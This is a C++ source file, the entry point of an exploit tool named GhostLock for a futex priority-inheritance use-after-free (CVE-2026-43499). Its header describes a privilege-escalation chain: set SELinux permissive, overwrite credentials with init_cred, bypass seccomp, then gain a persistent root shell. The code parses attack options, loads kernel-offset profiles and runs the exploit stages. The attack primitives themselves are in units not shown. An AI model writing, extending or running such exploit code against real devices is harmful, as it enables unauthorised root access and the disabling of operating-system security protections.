/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 *
 * This translation unit is the thin adapter: parse, run the stage sequence and
 * map the outcome to the process exit code. Setup, attack primitives, victim
 * protocol and stage policy live in their own units under ghostlock::attack,
 * ghostlock::session::victim, ghostlock::race and ghostlock::session::stages.
 */

#include "legacy/legacy_entrypoint_starter.h"
#include "profile/entry.h"
#include "support/fatal_error.hpp"
#include "route/orchestrator.hpp"

#include <array>
#include <memory>
#include <string_view>

using namespace ghostlock;


int main(int argc, char **argv) {
    try {
        profile::kernel_offsets decoded = {};
        std::array<char, 256> release_buf{};

        bool app_call = false;
        bool force_attack = false;
        const char *prebuilt_path = nullptr;
        const char *dump_dir = nullptr;
        for (int32_t i = 1; i < argc; i++) {
            if (std::string_view(argv[i]) == "--ghostlock-app-call") {
                app_call = true;
            } else if (std::string_view(argv[i]) == "--force-attack") {
                force_attack = true;
            } else if (std::string_view(argv[i]) == "--load-prebuilt-profile" &&i + 1 < argc) {
                prebuilt_path = argv[++i];
            } else if (std::string_view(argv[i]) == "--dump-kernel-log" && i + 1 < argc) {
                dump_dir = argv[++i];
            } else {
                pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin>]"
                " [--dump-kernel-log <dir>] [--force-attack]\n", argv[0]);
                return 1;
            }
        }
        if (app_call && prebuilt_path) {
            pr_error("choose one entrypoint\n");
            return 1;
        }

        int32_t loaded;
        if (prebuilt_path != nullptr) {
            loaded = profile_entry::read_glk1_file(prebuilt_path, &decoded, release_buf.data(), release_buf.size());
        } else if (app_call) {
            loaded = profile_entry::read_glk1_stdin(&decoded, release_buf.data(), release_buf.size());
        } else {
            loaded = legacy::start_legacy_entrypoint(&decoded, release_buf.data(), release_buf.size());
        }
        if (loaded != 0) {
            pr_error("cannot load profile\n");
            throw FatalError{};
        }

        auto &session = session::g_exploit_session;
        /* Batch 3 registry: the only shipped frontend/backend today; the
         * middleware comes from the decoded route. */
        const runtime::ComponentSelection selection{
            runtime::FrontendKind::RootChild,
            runtime::BackendKind::Cve2026_43499,
            decoded.route_kind(),
        };
        if (!runtime::selection_supported(selection)) {
            pr_error("unsupported component selection\n");
            throw FatalError{};
        }
        auto procedure = runtime::make_orchestrated_procedure(session, selection);
        if (!procedure) {
            pr_error("orchestrator rejected the component selection\n");
            throw FatalError{};
        }
        procedure->set_force_attack(force_attack);
        return procedure->run(decoded, dump_dir);
    } catch (const FatalError &) {
        return 1;
    }
}
